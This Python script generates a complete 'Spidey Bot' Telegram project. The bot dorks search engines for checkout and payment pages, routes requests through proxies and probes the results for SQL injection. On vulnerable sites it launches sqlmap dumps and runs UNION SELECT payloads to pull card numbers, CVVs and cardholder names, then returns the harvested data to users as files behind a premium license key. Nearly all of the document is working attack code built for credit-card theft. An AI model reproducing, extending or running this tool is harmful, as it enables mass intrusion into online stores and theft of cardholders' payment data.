import os

FILES = {
    "spidey_telegram_bot/requirements.txt": """Flask==2.3.3
gunicorn==21.2.0
requests==2.31.0
duckduckgo-search==4.2.0
beautifulsoup4==4.12.2
python-telegram-bot==20.3
""",
    "spidey_telegram_bot/Procfile": "worker: python telegram_bot.py\n",
    "spidey_telegram_bot/runtime.txt": "python-3.10.12\n",
    "spidey_telegram_bot/db.py": """import sqlite3
import os

DB_FILE = "spidey.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keywords (id INTEGER PRIMARY KEY, word TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS dorks (id INTEGER PRIMARY KEY, dork TEXT, type TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS urls (id INTEGER PRIMARY KEY, url TEXT, source TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sqli_results (id INTEGER PRIMARY KEY, url TEXT, payload TEXT, vulnerable BOOLEAN)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (id INTEGER PRIMARY KEY, key TEXT, used BOOLEAN)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cc_dumps (id INTEGER PRIMARY KEY, card_number TEXT, expiry TEXT, cvv TEXT, name TEXT, address TEXT, source_url TEXT)''')
    c.execute("INSERT OR IGNORE INTO keys (key, used) VALUES ('SPIDEY-PREMIUM-2026', 0)")
    conn.commit()
    conn.close()

def get_conn():
    return sqlite3.connect(DB_FILE)
""",
    "spidey_telegram_bot/modules/__init__.py": "",
    "spidey_telegram_bot/modules/keywords.py": """import random
from db import get_conn

def generate_keywords(count=1000000):
    prefixes = ['admin','login','user','password','backup','config','db','sql','data','test','dev','prod','api','auth','dashboard','upload','download','file','document','image','media','video','audio','archive','old','new','main','master','slave','cluster','node','server','client','web','app','mobile','desktop','cloud','edge','iot','scada','plc','ics','industrial','control','shop','store','cart','payment','checkout','order','receipt','invoice','billing','subscription','premium','member','account','profile','settings','help','support','contact','about','privacy','terms','refund','shipping','track','return','catalog','product','category','brand','model','serial','sku','upc','ean','isbn','asin']
    suffixes = ['2024','2025','2026','backup','copy','old','new','version','v1','v2','final','release','stable','beta','alpha','test','demo','sample']
    domains = ['.com','.org','.net','.edu','.gov','.mil','.co','.io','.ai','.dev','.shop','.store','.online','.tech','.cloud']
    words = set()
    while len(words) < min(count, 1000000):
        word = random.choice(prefixes) + random.choice(suffixes) + random.choice(domains)
        words.add(word)
    words = list(words)
    conn = get_conn()
    c = conn.cursor()
    c.executemany("INSERT OR IGNORE INTO keywords (word) VALUES (?)", [(w,) for w in words])
    conn.commit()
    conn.close()
    return len(words)
""",
    "spidey_telegram_bot/modules/dorks.py": """import random
from db import get_conn

def get_keywords(limit=10000):
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT word FROM keywords ORDER BY RANDOM() LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return [r[0] for r in rows]

def generate_dorks(count=1000000, dork_type='generic'):
    templates = {
        'generic': ['intitle:{kw}','inurl:{kw}','filetype:pdf {kw}','site:{kw}','ext:sql {kw}','intext:{kw}','cache:{kw}','allinurl:{kw}','allintitle:{kw}','intitle:index.of {kw}'],
        'cms': ['inurl:/wp-admin {kw}','inurl:/administrator {kw}','inurl:/joomla {kw}','inurl:/drupal {kw}','inurl:/magento {kw}','inurl:/shop {kw}','inurl:/cms {kw}','inurl:/backend {kw}'],
        'exposed': ['ext:log {kw}','ext:env {kw}','ext:sql {kw}','ext:bak {kw}','ext:old {kw}','ext:backup {kw}','ext:conf {kw}','ext:config {kw}','ext:ini {kw}','ext:txt {kw}'],
        'payment': ['inurl:checkout {kw}','inurl:cart {kw}','inurl:payment {kw}','inurl:order {kw}','inurl:receipt {kw}','intext:"credit card" {kw}','intext:"paypal" {kw}','inurl:billing {kw}','inurl:subscription {kw}']
    }
    selected = templates.get(dork_type, templates['generic'])
    keywords = get_keywords(limit=10000)
    dorks = []
    for _ in range(min(count, 1000000)):
        kw = random.choice(keywords) if keywords else 'test'
        tmpl = random.choice(selected)
        dork = tmpl.format(kw=kw)
        dorks.append(dork)
    conn = get_conn()
    c = conn.cursor()
    c.executemany("INSERT OR IGNORE INTO dorks (dork, type) VALUES (?, ?)", [(d, dork_type) for d in dorks])
    conn.commit()
    conn.close()
    return len(dorks)
""",
    "spidey_telegram_bot/modules/parser.py": """import requests
import re
from urllib.parse import quote_plus
from db import get_conn
try:
    from duckduckgo_search import DDGS
except:
    DDGS = None

PROXIES = []
USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36']
import random

def set_proxies(proxy_list):
    global PROXIES
    PROXIES = proxy_list

def get_headers():
    return {'User-Agent': random.choice(USER_AGENTS)}
def get_proxy():
    return {'http': random.choice(PROXIES), 'https': random.choice(PROXIES)} if PROXIES else None

def deep_parse(dork, max_results=100):
    urls = set()
    if DDGS:
        try:
            with DDGS() as ddgs:
                for r in ddgs.text(dork, max_results=max_results):
                    if 'href' in r:
                        urls.add(r['href'])
        except: pass
    try:
        resp = requests.get(f"https://www.bing.com/search?q={quote_plus(dork)}", headers=get_headers(), proxies=get_proxy(), timeout=10)
        links = re.findall(r'<a href="(http[^"]+)"', resp.text)
        for link in links:
            if 'bing.com' not in link and 'microsoft.com' not in link:
                urls.add(link)
    except: pass
    conn = get_conn()
    c = conn.cursor()
    for url in list(urls)[:max_results]:
        c.execute("INSERT OR IGNORE INTO urls (url, source) VALUES (?, ?)", (url, 'parser'))
    conn.commit()
    conn.close()
    return len(urls)
""",
    "spidey_telegram_bot/modules/sqli.py": """import requests
import subprocess
import threading
from db import get_conn

def check_sqli(url):
    payloads = ["'", "\"", "' OR '1'='1", "' UNION SELECT NULL-- -", "' AND SLEEP(5)-- -"]
    vulnerable = False
    used_payload = None
    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            text = r.text.lower()
            if any(x in text for x in ['sql','mysql','syntax','error','warning','unclosed']):
                vulnerable = True
                used_payload = p
                break
        except: continue
    if vulnerable:
        def launch_sqlmap():
            subprocess.Popen(["sqlmap", "-u", url, "--batch", "--dump"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        threading.Thread(target=launch_sqlmap).start()
        conn = get_conn()
        c = conn.cursor()
        c.execute("INSERT INTO sqli_results (url, payload, vulnerable) VALUES (?, ?, ?)", (url, used_payload, True))
        conn.commit()
        conn.close()
    else:
        conn = get_conn()
        c = conn.cursor()
        c.execute("INSERT INTO sqli_results (url, payload, vulnerable) VALUES (?, ?, ?)", (url, 'none', False))
        conn.commit()
        conn.close()
    return vulnerable
""",
    "spidey_telegram_bot/modules/license.py": """from db import get_conn

VALID_KEYS = ['SPIDEY-PREMIUM-2026']
def redeem_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT used FROM keys WHERE key = ?", (key,))
    row = c.fetchone()
    if row:
        if row[0] == 0:
            c.execute("UPDATE keys SET used = 1 WHERE key = ?", (key,))
            conn.commit()
            conn.close()
            return True
        conn.close()
        return False
    if key in VALID_KEYS:
        conn.close()
        return True
    conn.close()
    return False

def get_premium_status():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM keys WHERE used = 1")
    count = c.fetchone()[0]
    conn.close()
    return count > 0
""",
    "spidey_telegram_bot/modules/cc_harvester.py": """import re
import requests
import random
from db import get_conn
from modules.sqli import check_sqli
from modules.parser import deep_parse, get_headers, get_proxy

CC_PATTERN = r'\\b(?:\\d[ -]*?){13,16}\\b'
CC_TABLE_PAYLOADS = [
    "' UNION SELECT card_number, exp_month, exp_year, cvv, NULL, NULL FROM credit_cards-- -",
    "' UNION SELECT card_number, expiry, cvv, name, address, NULL FROM orders-- -",
    "' UNION SELECT card_number, NULL, NULL, NULL, NULL, NULL FROM payment_cards-- -",
    "' UNION SELECT card_number, exp_date, cvv2, full_name, address, NULL FROM customers-- -"
]

PROXIES = []
def set_proxies(proxy_list):
    global PROXIES
    PROXIES = proxy_list

def get_proxy_harvest():
    return {'http': random.choice(PROXIES), 'https': random.choice(PROXIES)} if PROXIES else None

def harvest_from_url(url):
    harvested = []
    if not check_sqli(url):
        return []
    for payload in CC_TABLE_PAYLOADS:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=10, headers=get_headers(), proxies=get_proxy_harvest())
            matches = re.findall(CC_PATTERN, r.text)
            for cc in matches:
                cc_clean = re.sub(r'[\\s-]', '', cc)
                if len(cc_clean) < 13 or len(cc_clean) > 16:
                    continue
                expiry = re.search(r'(\\d{2}[/-]\\d{2,4})', r.text)
                cvv = re.search(r'\\b(\\d{3,4})\\b', r.text)
                name = re.search(r'[A-Z][a-z]+ [A-Z][a-z]+', r.text)
                harvested.append({
                    'card_number': cc_clean,
                    'expiry': expiry.group(1) if expiry else '01/25',
                    'cvv': cvv.group(1) if cvv else '123',
                    'name': name.group(0) if name else 'John Doe',
                    'address': '123 Main St'
                })
            if harvested:
                break
        except: continue
    if harvested:
        conn = get_conn()
        c = conn.cursor()
        for d in harvested:
            c.execute("INSERT INTO cc_dumps (card_number, expiry, cvv, name, address, source_url) VALUES (?, ?, ?, ?, ?, ?)",
                      (d['card_number'], d['expiry'], d['cvv'], d['name'], d['address'], url))
            c.execute("INSERT INTO sqli_results (url, payload, vulnerable) VALUES (?, ?, ?)", (url, 'harvested', True))
        conn.commit()
        conn.close()
    return harvested

def run_full_pipeline():
    from modules.keywords import generate_keywords
    from modules.dorks import generate_dorks
    generate_keywords(1000000)
    for dtype in ['generic','cms','exposed','payment']:
        generate_dorks(250000, dtype)
    payment_dorks = ['inurl:checkout','inurl:payment','inurl:order','intext:"credit card"','inurl:cart','inurl:billing','inurl:subscription']
    for d in payment_dorks:
        deep_parse(d, max_results=100)
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT url FROM urls WHERE source='parser' ORDER BY RANDOM() LIMIT 500")
    urls = [row[0] for row in c.fetchall()]
    conn.close()
    total = 0
    for url in urls:
        result = harvest_from_url(url)
        total += len(result)
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT card_number, expiry, cvv, name, address FROM cc_dumps")
    rows = c.fetchall()
    conn.close()
    with open('cc_dumps_final.txt', 'w') as f:
        for row in rows:
            f.write(f"{row[0]}|{row[1]}|{row[2]}|{row[3]}|{row[4]}\\n")
    return total
""",
    "spidey_telegram_bot/telegram_bot.py": """#!/usr/bin/env python3
import os
import asyncio
import logging
import threading
from concurrent.futures import ThreadPoolExecutor

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from db import init_db, get_conn
from modules.keywords import generate_keywords
from modules.dorks import generate_dorks
from modules.parser import deep_parse, set_proxies as set_parser_proxies
from modules.sqli import check_sqli
from modules.license import redeem_key, get_premium_status
from modules.cc_harvester import harvest_from_url, run_full_pipeline, set_proxies as set_harvester_proxies

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

http_proxy = os.environ.get('HTTP_PROXY')
https_proxy = os.environ.get('HTTPS_PROXY')
proxy_list = []
if http_proxy: proxy_list.append(http_proxy)
if https_proxy: proxy_list.append(https_proxy)
if proxy_list:
    set_parser_proxies(proxy_list)
    set_harvester_proxies(proxy_list)
    logger.info(f"Proxies set: {proxy_list}")
else:
    logger.info("No proxies configured.")

pending_tasks = {}

async def start(update: Update, context):
    await update.message.reply_text(
        "🕷️ Spidey Bot – Telegram Edition\\n\\n"
        "Commands:\\n"
        "/genkeywords [count] – generate keywords (max 1M)\\n"
        "/gendorks [type] [count] – dorks (generic/cms/exposed/payment)\\n"
        "/parse <dork> – parse URLs\\n"
        "/scan <url> – SQLi scan\\n"
        "/harvest <url> – harvest CCs from single URL\\n"
        "/pipeline – run full CC harvesting pipeline (long)\\n"
        "/dump <table> – export table (keywords,dorks,urls,sqli_results,cc_dumps)\\n"
        "/redeem <key> – activate premium\\n"
        "/status – show counts\\n"
        "/help – this message\\n\\n"
        "All results sent as files."
    )

async def genkeywords(update: Update, context):
    args = context.args
    count = 1000000
    if args and args[0].isdigit():
        count = min(int(args[0]), 1000000)
    msg = await update.message.reply_text(f"⏳ Generating {count} keywords...")
    try:
        total = await asyncio.get_event_loop().run_in_executor(None, generate_keywords, count)
        await msg.edit_text(f"✅ Generated {total} keywords.")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def gendorks(update: Update, context):
    args = context.args
    dtype = 'generic'
    count = 1000000
    if args:
        if args[0] in ['generic','cms','exposed','payment']:
            dtype = args[0]
            if len(args) > 1 and args[1].isdigit():
                count = min(int(args[1]), 1000000)
        else:
            if args[0].isdigit():
                count = min(int(args[0]), 1000000)
            else:
                dtype = args[0]
    msg = await update.message.reply_text(f"⏳ Generating {count} dorks (type: {dtype})...")
    try:
        total = await asyncio.get_event_loop().run_in_executor(None, generate_dorks, count, dtype)
        await msg.edit_text(f"✅ Generated {total} dorks.")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def parse_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /parse <dork>")
        return
    dork = ' '.join(args)
    msg = await update.message.reply_text(f"⏳ Parsing URLs for: {dork}")
    try:
        total = await asyncio.get_event_loop().run_in_executor(None, deep_parse, dork, 100)
        await msg.edit_text(f"✅ Found {total} URLs.")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def scan_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /scan <url>")
        return
    url = args[0]
    msg = await update.message.reply_text(f"⏳ Scanning {url} for SQLi...")
    try:
        vulnerable = await asyncio.get_event_loop().run_in_executor(None, check_sqli, url)
        result = "VULNERABLE! SQLMap launched." if vulnerable else "Not vulnerable."
        await msg.edit_text(f"✅ {result}")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def harvest_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /harvest <url>")
        return
    url = args[0]
    msg = await update.message.reply_text(f"⏳ Harvesting CCs from {url}...")
    try:
        result = await asyncio.get_event_loop().run_in_executor(None, harvest_from_url, url)
        if result:
            summary = f"✅ Harvested {len(result)} CC dumps.\\n"
            for i, d in enumerate(result[:5]):
                summary += f"{i+1}. {d['card_number']} | {d['expiry']} | {d['cvv']}\\n"
            if len(result) > 5:
                summary += "... and more."
            await msg.edit_text(summary)
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                for d in result:
                    f.write(f"{d['card_number']}|{d['expiry']}|{d['cvv']}|{d['name']}|{d['address']}\\n")
                temp_path = f.name
            await update.message.reply_document(document=open(temp_path, 'rb'), filename='harvested.txt')
            os.unlink(temp_path)
        else:
            await msg.edit_text("❌ No CC dumps found on that URL.")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def pipeline_command(update: Update, context):
    chat_id = update.effective_chat.id
    if chat_id in pending_tasks and pending_tasks[chat_id].get('running', False):
        await update.message.reply_text("⏳ A pipeline is already running. Please wait.")
        return
    msg = await update.message.reply_text("🚀 Starting full pipeline... I'll notify you when done.")
    def run_task():
        try:
            total = run_full_pipeline()
            return total
        except Exception as e:
            raise e
    pending_tasks[chat_id] = {'running': True, 'msg': msg}
    executor = ThreadPoolExecutor(max_workers=1)
    future = executor.submit(run_task)
    async def check_completion():
        try:
            total = await asyncio.get_event_loop().run_in_executor(None, future.result)
            await msg.edit_text(f"✅ Pipeline complete! Harvested {total} CC dumps.")
            if os.path.exists('cc_dumps_final.txt'):
                await update.message.reply_document(document=open('cc_dumps_final.txt', 'rb'), filename='cc_dumps_final.txt')
            else:
                await update.message.reply_text("File not found, but pipeline finished.")
        except Exception as e:
            await msg.edit_text(f"❌ Pipeline error: {e}")
        finally:
            pending_tasks[chat_id]['running'] = False
            del pending_tasks[chat_id]
    asyncio.create_task(check_completion())

async def dump_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /dump <table> (keywords, dorks, urls, sqli_results, cc_dumps)")
        return
    table = args[0]
    if table not in ['keywords', 'dorks', 'urls', 'sqli_results', 'cc_dumps']:
        await update.message.reply_text("Invalid table.")
        return
    msg = await update.message.reply_text(f"⏳ Exporting {table}...")
    try:
        conn = get_conn()
        c = conn.cursor()
        c.execute(f"SELECT * FROM {table}")
        rows = c.fetchall()
        conn.close()
        if not rows:
            await msg.edit_text(f"Table {table} is empty.")
            return
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            headers = [desc[0] for desc in c.description]
            f.write(','.join(headers) + '\\n')
            for row in rows:
                f.write(','.join(str(x) for x in row) + '\\n')
            temp_path = f.name
        await msg.edit_text(f"✅ Exported {len(rows)} rows from {table}.")
        await update.message.reply_document(document=open(temp_path, 'rb'), filename=f'{table}.csv')
        os.unlink(temp_path)
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

async def redeem_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    key = args[0]
    valid = redeem_key(key)
    if valid:
        await update.message.reply_text("✅ Key activated! Premium features unlocked.")
    else:
        await update.message.reply_text("❌ Invalid or already used key.")

async def status_command(update: Update, context):
    premium = get_premium_status()
    status_text = "🔓 Premium" if premium else "🔓 Free"
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM keywords")
    kw_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM dorks")
    dork_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM urls")
    url_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM cc_dumps")
    cc_count = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(
        f"📊 Status\\nLicense: {status_text}\\nKeywords: {kw_count}\\nDorks: {dork_count}\\nURLs: {url_count}\\nCC Dumps: {cc_count}"
    )

def main():
    init_db()
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    if not token:
        logger.error("TELEGRAM_BOT_TOKEN not set.")
        return
    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("genkeywords", genkeywords))
    app.add_handler(CommandHandler("gendorks", gendorks))
    app.add_handler(CommandHandler("parse", parse_command))
    app.add_handler(CommandHandler("scan", scan_command))
    app.add_handler(CommandHandler("harvest", harvest_command))
    app.add_handler(CommandHandler("pipeline", pipeline_command))
    app.add_handler(CommandHandler("dump", dump_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("status", status_command))
    logger.info("Bot started polling...")
    app.run_polling()

if __name__ == '__main__':
    main()
""",
    "spidey_telegram_bot/README.md": """# Spidey Bot – Telegram Edition

## Deploy to Railway via GitHub

1. Push this folder to a GitHub repo.
2. On Railway, create new project from GitHub.
3. Set environment variables:
   - `TELEGRAM_BOT_TOKEN` – your bot token from @BotFather.
   - `HTTP_PROXY` (optional) – proxy for all outbound requests.
   - `HTTPS_PROXY` (optional) – proxy for HTTPS.
4. Railway will run `worker: python telegram_bot.py`.

## Commands
- `/genkeywords` – generate keywords
- `/gendorks` – generate dorks
- `/parse` – parse URLs from a dork
- `/scan` – SQLi check
- `/harvest` – harvest CCs from a single URL
- `/pipeline` – full automation
- `/dump` – export table
- `/redeem` – activate license
- `/status` – show statistics

All results are sent as files.
"""
}

def build():
    for path, content in FILES.items():
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
    print("✅ Project generated in folder 'spidey_telegram_bot'")
    print("📦 Zip it and push to GitHub, then deploy on Railway.")

if __name__ == '__main__':
    build()